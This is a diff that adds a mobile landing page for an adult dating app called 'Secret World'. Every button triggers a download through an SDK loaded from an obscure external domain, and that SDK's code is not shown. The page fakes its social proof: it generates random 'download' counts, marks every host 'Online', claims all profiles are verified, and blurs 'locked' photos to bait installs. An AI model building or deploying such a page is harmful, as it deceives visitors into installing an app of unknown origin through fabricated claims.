@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secret World UI</title>
+    <!-- 引入 FontAwesome 图标 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+	
+	
+   
+   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+   
+    <style>
+        :root {
+            --bg-color: #fff0f6;
+            --card-bg: #ffffff;
+            --primary-pink: #ff2d7b;
+            --primary-purple: #e0117c;
+            --text-main: #3d0a2e;
+            --text-sub: #a1637f;
+            --gradient-btn: linear-gradient(90deg, #ff6fb5 0%, #ff2d7b 100%);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #ffe3ee;
+            display: flex;
+            justify-content: center;
+            color: var(--text-main);
+        }
+
+        /* 模拟手机屏幕容器 */
+        .mobile-container {
+            width: 100%;
+            max-width: 430px;
+            background-color: var(--bg-color);
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+            padding-bottom: 100px;
+        }
+
+        /* 顶部导航 */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-img {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            object-fit: cover;
+            box-shadow: 0 2px 10px rgba(255, 45, 123, 0.25);
+        }
+
+        .logo-text h1 {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--primary-purple);
+        }
+
+        .logo-text p {
+            font-size: 10px;
+            color: var(--text-sub);
+        }
+
+        /* 主视觉区 */
+        .hero {
+            padding: 10px 20px 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50px;
+            right: -50px;
+            width: 220px;
+            height: 220px;
+            background: url('img/15-1.jpg') center/cover;
+            border-radius: 50%;
+            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.5), 0 0 20px rgba(255, 45, 123, 0.30), 0 12px 28px rgba(255, 45, 123, 0.22);
+            z-index: -1;
+        }
+
+        .hero h2 {
+            font-size: 19px;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 5px;
+            padding-right: 110px;
+        }
+
+        .hero h2 .highlight {
+            background: var(--gradient-btn);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            font-size: 13px;
+            color: var(--text-sub);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .cta-main {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--gradient-btn);
+            color: #fff;
+            padding: 14px 28px;
+            border-radius: 30px;
+            font-weight: 800;
+            font-size: 16px;
+            cursor: pointer;
+			margin-top: 40px;
+            box-shadow: 0 6px 18px rgba(255, 45, 123, 0.4);
+            transition: transform 0.2s;
+        }
+
+        .cta-main:active {
+            transform: scale(0.95);
+        }
+
+        .hero-tagline {
+            position: absolute;
+            right: 10px;
+            bottom: 40px;
+            font-size: 12px;
+            font-style: italic;
+            color: #ff2d7b;
+            text-align: right;
+            transform: rotate(-10deg);
+            line-height: 1.3;
+        }
+
+        /* 在线人数统计 */
+        .stats-bar {
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .avatars {
+            display: flex;
+        }
+
+        .avatars img {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 2px solid var(--bg-color);
+            margin-left: -8px;
+        }
+        .avatars img:first-child { margin-left: 0; }
+
+        .stats-text {
+            font-size: 12px;
+            color: #4cd964;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .stats-text::before {
+            content: '';
+            width: 6px;
+            height: 6px;
+            background: #4cd964;
+            border-radius: 50%;
+            box-shadow: 0 0 5px #4cd964;
+        }
+
+        /* 功能特性图标栏 */
+        .features-bar {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            padding: 0 20px;
+            margin-bottom: 25px;
+        }
+
+        .feature-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            gap: 8px;
+        }
+
+        .feature-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(255, 45, 123, 0.1);
+            border: 1px solid rgba(255, 45, 123, 0.28);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--primary-pink);
+            font-size: 16px;
+        }
+
+        .feature-item span {
+            font-size: 10px;
+            color: var(--text-sub);
+            line-height: 1.2;
+        }
+
+        /* 在线聊天室列表 */
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            margin-bottom: 15px;
+        }
+
+        .section-header h3 {
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .section-header h3::before {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background: #4cd964;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #4cd964;
+        }
+
+        .view-all {
+            font-size: 12px;
+            color: var(--text-sub);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+        }
+
+        /* 照片墙：上下错开滚动 */
+        .rooms-wall {
+            position: relative;
+            height: 900px;
+            overflow: hidden;
+            margin: 0 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            -webkit-mask-image: linear-gradient(to bottom, transparent 0%, #000 6%, #000 94%, transparent 100%);
+            mask-image: linear-gradient(to bottom, transparent 0%, #000 6%, #000 94%, transparent 100%);
+        }
+        .rooms-wall__col {
+            flex: 1;
+            min-width: 0;
+            display: flex;
+            flex-direction: column;
+            will-change: transform;
+        }
+        .rooms-wall__col .room-card {
+            flex-shrink: 0;
+            margin-bottom: 12px;
+        }
+        .rooms-wall__col--up {
+            animation: wall-scroll-up 40s linear infinite;
+        }
+        @keyframes wall-scroll-up {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+
+        .room-card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            overflow: hidden;
+            position: relative;
+            height: 240px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+        }
+
+        .card-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 0;
+        }
+
+        .room-card.is-locked .card-bg {
+            filter: blur(6px);
+            transform: scale(1.15);
+            opacity: 0.55;
+        }
+
+        .card-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, rgba(0,0,0,0) 0%, rgba(0,0,0,0) 55%, rgba(61,10,46,0.92) 100%);
+            z-index: 1;
+        }
+
+        .status-badge {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: #4cd964;
+            color: #000;
+            font-size: 10px;
+            font-weight: bold;
+            padding: 3px 8px;
+            border-radius: 10px;
+            z-index: 2;
+        }
+        
+        .status-badge.private {
+            background: var(--primary-pink);
+            color: #fff;
+        }
+
+        .lock-badge {
+            position: absolute;
+            top: 46%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 26px;
+            height: 26px;
+            background: rgba(0, 0, 0, 0.45);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 11px;
+            z-index: 2;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .card-info {
+            position: relative;
+            z-index: 2;
+            padding: 14px;
+        }
+
+        .card-info h4 {
+            font-size: 15px;
+            margin-bottom: 6px;
+            color: #fff;
+        }
+
+        .card-meta {
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.85);
+            margin-bottom: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .card-meta .location {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        
+        .card-meta .status {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #4cd964;
+        }
+
+        .card-btn {
+            width: 100%;
+            padding: 9px 0;
+            border-radius: 8px;
+            border: none;
+            background: var(--gradient-btn);
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+            white-space: nowrap;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+        }
+
+        .card-btn.disabled {
+            background: #f7dce9;
+            color: #c491a6;
+            cursor: not-allowed;
+        }
+
+        /* 底部横幅 */
+        .bottom-banner {
+            margin: 20px;
+            background: #ffffff;
+            border: 1px solid rgba(255, 45, 123, 0.22);
+            border-radius: 16px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 8px 24px rgba(255, 45, 123, 0.08);
+        }
+
+        .banner-text h4 {
+            font-size: 14px;
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .banner-text h4 i {
+            color: var(--primary-pink);
+            background: rgba(255, 45, 123, 0.12);
+            padding: 6px;
+            border-radius: 50%;
+        }
+
+        .banner-text p {
+            font-size: 10px;
+            color: var(--text-sub);
+        }
+
+        .banner-btn {
+            background: var(--gradient-btn);
+            color: #fff;
+            border: none;
+            padding: 9px 18px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            white-space: nowrap;
+            box-shadow: 0 4px 12px rgba(255, 45, 123, 0.3);
+        }
+
+        /* 页脚 */
+        footer {
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .footer-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-sub);
+        }
+
+        .footer-item i {
+            color: var(--primary-purple);
+            font-size: 16px;
+        }
+
+        .footer-item span {
+            font-size: 9px;
+            text-align: center;
+        }
+
+        .copyright {
+            text-align: center;
+            font-size: 10px;
+            color: #b98aa0;
+            padding-bottom: 20px;
+        }
+        /* 底部新增 CTA 区块 */
+        .bottom-cta {
+            margin: 20px;
+            padding: 25px 20px;
+            text-align: center;
+            background: linear-gradient(180deg, #ffffff, #ffe3ee);
+            border: 1px solid rgba(255, 45, 123, 0.22);
+            border-radius: 18px;
+            box-shadow: 0 10px 28px rgba(255, 45, 123, 0.1);
+        }
+        .bottom-cta h3 {
+            font-size: 21px;
+            font-weight: 800;
+            line-height: 1.3;
+            margin-bottom: 10px;
+        }
+        .bottom-cta p {
+            font-size: 13px;
+            color: var(--text-sub);
+            line-height: 1.6;
+            margin-bottom: 18px;
+        }
+        .bottom-cta-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--gradient-btn);
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 6px 18px rgba(255, 45, 123, 0.4);
+            transition: transform 0.2s;
+        }
+        .bottom-cta-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* 悬浮底部按钮 */
+        .floating-cta {
+            position: fixed;
+            bottom: 16px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: calc(100% - 40px);
+            max-width: 390px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: var(--gradient-btn);
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            padding: 16px 24px;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            z-index: 100;
+            box-shadow: 0 6px 20px rgba(255, 45, 123, 0.5);
+            transition: transform 0.2s;
+        }
+        .floating-cta:active {
+            transform: translateX(-50%) scale(0.96);
+        }
+        .floating-cta::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 30px;
+            box-shadow: 0 0 0 0 rgba(255, 45, 123, 0.55);
+            animation: cta-pulse 2s infinite;
+        }
+        @keyframes cta-pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 45, 123, 0.55); }
+            70% { box-shadow: 0 0 0 14px rgba(255, 45, 123, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 45, 123, 0); }
+        }
+
+        /* 桌面端适配 */
+        @media (min-width: 768px) {
+            .mobile-container {
+                max-width: 1000px;
+            }
+            header {
+                padding-left: 40px;
+                padding-right: 40px;
+            }
+            .hero {
+                padding-left: 40px;
+                padding-right: 40px;
+            }
+            .hero h2 {
+                font-size: 40px;
+            }
+            .hero::before {
+                top: -10px;
+                right: 40px;
+                width: 340px;
+                height: 340px;
+            }
+            .stats-bar,
+            .features-bar,
+            .section-header,
+            footer {
+                padding-left: 40px;
+                padding-right: 40px;
+            }
+            .rooms-wall {
+                height: 1000px;
+                margin-left: 40px;
+                margin-right: 40px;
+            }
+            .room-card {
+                height: 300px;
+            }
+            .bottom-banner,
+            .bottom-cta {
+                margin-left: 40px;
+                margin-right: 40px;
+            }
+        }
+    </style>
+    <script>
+        function k2() {
+            MeetU.download(event);
+        }
+    </script>
+</head>
+<body>
+
+<div class="mobile-container">
+    <!-- Header -->
+    <header>
+        <div class="logo-area">
+            <img class="logo-img" src="img/logo.jpg" alt="Secret World logo">
+            <div class="logo-text">
+                <h1>Secret World</h1>
+                <p>Online</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <h2>LIVE · Casual Dating</h2>
+        <h2 class="highlight">Find Your Perfect Match</h2>
+        <p>Real-time online video – Real people are online right now, video chat instantly..</p>
+        
+        <button class="cta-main" onclick="k2()">
+            <i class="fas fa-video"></i> Download App to Watch <i class="fas fa-chevron-right" style="font-size: 12px;"></i>
+        </button>
+
+    </section>
+
+    <!-- Stats Bar -->
+    <div class="stats-bar">
+        <div class="avatars">
+            <img src="img/a/c1.jpg" alt="avatar">
+            <img src="img/a/c2.jpg" alt="avatar">
+            <img src="img/a/c3.jpg" alt="avatar">
+            <img src="img/a/c4.jpg" alt="avatar">
+        </div>
+        <div class="stats-text">People browsing now</div>
+    </div>
+
+    <!-- Features Bar -->
+    <div class="features-bar">
+        <div class="feature-item">
+            <div class="feature-icon"><i class="fas fa-gift"></i></div>
+            <span>100%<br>Free to join</span>
+        </div>
+        <div class="feature-item">
+            <div class="feature-icon"><i class="fas fa-users"></i></div>
+            <span>24/7<br>Real members</span>
+        </div>
+        <div class="feature-item">
+            <div class="feature-icon"><i class="fas fa-bolt"></i></div>
+            <span>Instant<br>Matching</span>
+        </div>
+        <div class="feature-item">
+            <div class="feature-icon"><i class="fas fa-download"></i></div>
+            <span>500K+<br>Downloads</span>
+        </div>
+    </div>
+
+    <!-- Online Rooms Header -->
+    <div class="section-header">
+        <div>
+            <h3>🔥 Most Viewed Right Now</h3>
+            <p style="font-size: 12px; color: var(--text-sub); margin-top: 4px;">Who's Available Tonight</p>
+        </div>
+        <a href="#" class="view-all">View All <i class="fas fa-chevron-right"></i></a>
+    </div>
+
+    <!-- Rooms Wall (staggered vertical scroll photo wall) -->
+    <div class="rooms-wall" id="rooms-wall"></div>
+
+    <!-- Safe & Private -->
+    <h3 style="padding: 0 20px; font-size: 16px; margin: 0 0 16px;">Safe &amp; Private</h3>
+    <footer>
+        <div class="footer-item">
+            <i class="fas fa-user-secret"></i>
+            <span>Privacy<br>Your identity is protected</span>
+        </div>
+        <div class="footer-item">
+            <i class="fas fa-check-circle"></i>
+            <span>Verified<br>All profiles reviewed</span>
+        </div>
+        <div class="footer-item">
+            <i class="fas fa-headset"></i>
+            <span>Support<br>Help when you need it</span>
+        </div>
+    </footer>
+
+    <!-- Bottom CTA -->
+    <div class="bottom-cta">
+        <span style="display:inline-block; background:#4cd964; color:#fff; font-size:12px; font-weight:bold; padding:4px 14px; border-radius:20px; margin-bottom:10px;">Free</span>
+        <h3>Unlock Full Access</h3>
+        <p>Download the app to watch everything free — every profile, photo and chat.</p>
+        <div style="display:inline-block; text-align:left; font-size:13px; color:var(--text-main); line-height:2; margin-bottom:18px;">
+            ✓ 100% free to join<br>
+            ✓ See every profile &amp; photo<br>
+            ✓ Chat with real local singles
+        </div>
+        <button class="bottom-cta-btn" onclick="k2()">
+            Get the App Free · Start Now <i class="fas fa-chevron-right" style="font-size: 12px;"></i>
+        </button>
+        <div style="margin-top:14px; font-size:11px; color:var(--text-sub);">🔒 Secure &amp; private — no credit card required</div>
+    </div>
+
+    <div class="copyright">
+        Secret World © 2026 | 18+ Only
+    </div>
+
+    <button class="floating-cta" onclick="k2()">
+        <i class="fas fa-video"></i> Download App to Watch
+    </button>
+
+</div>
+
+    <script>
+        (function () {
+            const GIRLS = [
+                { img: "1.jpg",    locked: true  },
+                { img: "2.jpg",    locked: false },
+                { img: "3.jpg",    locked: true  },
+                { img: "4.jpg",    locked: true  },
+                { img: "4-1.jpg",  locked: false },
+                { img: "5.jpg",    locked: true  },
+                { img: "6-1.jpg",  locked: false },
+                { img: "15-1.jpg", locked: true  },
+                { img: "14.jpg",   locked: true  },
+                { img: "b1.jpg",   locked: false },
+                { img: "b2.jpg",   locked: true  },
+                { img: "b3.jpg",   locked: true  },
+                { img: "b4.jpg",   locked: false }
+            ];
+            GIRLS.forEach(function (g) {
+                g.downloads = Math.floor(10000 + Math.random() * 70001).toLocaleString('en-US');
+            });
+
+            function cardHTML(g) {
+                const lockClass = g.locked ? ' is-locked' : '';
+                const lock = g.locked
+                    ? '<div class="lock-badge"><i class="fas fa-lock"></i></div>'
+                    : '';
+                return '<div class="room-card' + lockClass + '">'
+                    + '<img class="card-bg" src="img/' + g.img + '" alt="Live host">'
+                    + '<div class="card-overlay"></div>'
+                    + lock
+                    + '<div class="status-badge">Online</div>'
+                    + '<div class="card-info">'
+                    + '<h4>🔥 ' + g.downloads + '</h4>'
+                    + '<div class="card-meta">'
+                    + '<span class="status"><i class="fas fa-circle" style="font-size: 6px;"></i> Online · Waiting</span>'
+                    + '</div>'
+                    + '<button class="card-btn" onclick="k2()"><i class="fas fa-video"></i> Download App to Watch</button>'
+                    + '</div>'
+                    + '</div>';
+            }
+
+            var lastColCount = 0;
+            function renderWall() {
+                var colCount = window.innerWidth >= 768 ? 4 : 2;
+                if (colCount === lastColCount) return;
+                lastColCount = colCount;
+
+                var cols = [];
+                for (var c = 0; c < colCount; c++) cols.push([]);
+                GIRLS.forEach(function (g, i) { cols[i % colCount].push(g); });
+
+                var maxCards = 0;
+                cols.forEach(function (list) { if (list.length > maxCards) maxCards = list.length; });
+
+                var wall = document.getElementById('rooms-wall');
+                wall.innerHTML = cols.map(function (list) {
+                    var duration = (40 * list.length / maxCards).toFixed(2);
+                    var content = list.map(cardHTML).join('');
+                    return '<div class="rooms-wall__col rooms-wall__col--up" style="animation-duration:' + duration + 's">'
+                        + content + content
+                        + '</div>';
+                }).join('');
+            }
+
+            renderWall();
+            window.addEventListener('resize', renderWall);
+        })();
+    </script>
+
+</body>
+</html>
